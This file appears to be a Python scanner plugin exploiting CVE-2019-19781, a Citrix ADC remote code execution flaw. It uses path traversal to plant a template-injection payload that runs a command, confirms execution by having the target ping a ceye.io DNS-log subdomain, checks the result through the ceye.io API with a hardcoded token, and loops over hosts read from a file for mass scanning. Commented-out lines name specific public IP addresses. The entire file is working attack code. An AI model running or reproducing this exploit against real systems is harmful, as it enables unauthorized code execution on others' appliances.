#coding=utf-8

import requests,sys,uuid
import requests.packages.urllib3
import traceback
requests.packages.urllib3.disable_warnings()

def get_plugin_info():
    plugin_info = {
        "name": "Citrix ADC Remote Code Execution(CVE-2019-19781)",
        "info": "CVE-2019-19781",
        "level": "紧急",
        "type": "远程命令执行",
        "author": "jas502n",
        "url": "https://github.com/jas502n/CVE-2019-19781",
        "keyword": "server:web",
        "source": 1
    }
    return plugin_info


def check_dnslog2(target):
    url = 'http://api.ceye.io/v1/records?token=475b1fa59d53a9b2cedfdd8c98ff4ace&type=dns&filter='+ target[:19]
    #print url
    try:
        r = requests.get(url=url)
        #print r.content
        if 'id' in r.content and 'name' in r.content:
            #print r.content
            return True
        return False
    except:
        return False

def upload_xml(url,cdl,cmd):
    newbm_url = url + '/vpn/../vpns/portal/scripts/newbm.pl'
    headers = {
    "Connection": "close",
    "NSC_USER": "../../../netscaler/portal/templates/%s"%cdl,
    "NSC_NONCE": "nsroot"
    }
    payload = "url=http://example.com&title=" + cdl + "&desc=[% template.new('BLOCK' = 'print `"+ cmd + "`') %]"
    #proxies = {"http":"127.0.0.1:8080","https":"127.0.0.1:8080"}
    proxies = {}

    r = requests.post(url=newbm_url, headers=headers,data=payload,proxies=proxies, verify=False,allow_redirects=False, timeout=3)
    # print r.content

    if r.status_code == 200 and 'parent.window.ns_reload' in r.content:
        print "\n","[+] Upload_Xml= ",newbm_url
        print '[+] Upload successful!\n'

        if xml_url(url,cdl,cmd):
            return True
    else:
        print "[+] Upload Fail!"
    return False

def xml_url(url,cdl,cmd):
    xml_url = url + '/vpn/../vpns/portal/%s.xml' % cdl
    headers = {
    "NSC_USER": "nsroot",
    "NSC_NONCE": "nsroot"
    }
    #proxies = {"http":"127.0.0.1:8080","https":"127.0.0.1:8080"}
    proxies = {}
    r = requests.get(xml_url,headers=headers, verify=False,proxies=proxies, timeout=3)
    # print r.headers()

    if r.status_code == 200:
        #print "[+] Xml_Url= ",xml_url
        #print "[+] Command= ",cmd
        #print "[+] Exec Result:  \n____________________________________________________________\n\n %s____________________________________________________________\n" % r.content.split("&#117;")[0]
        if check_dnslog2(cmd.split(' ')[1]):
            print 'YES'
            return True

def check(host, port, timeout):

    try:
        if port == 443:
            url = "https://%s" % (host, )
        else:
            url = "http://%s:%d" % (host, port)
        print url
        cdl = str(uuid.uuid4()).split('-')[0]
        cmd = 'ping %s-%d.8em7js.ceye.io -c 1' % (host, port)
        if upload_xml(url,cdl,cmd):
            return '远程命令执行'
    except Exception as e:
        print traceback.print_exc()
    
    return False

if __name__ == '__main__':
    #check('114.80.247.234', 443, 3)
    #check('71.174.244.106', 443, 3)
    with open('url1.txt', 'r') as f:
        content = f.read().split('\n')
    for line in content:
        if not line: continue
        host = line.split('\t')[0]
        port = int(line.split('\t')[1])
        #print host, port
        check(host, port, 3)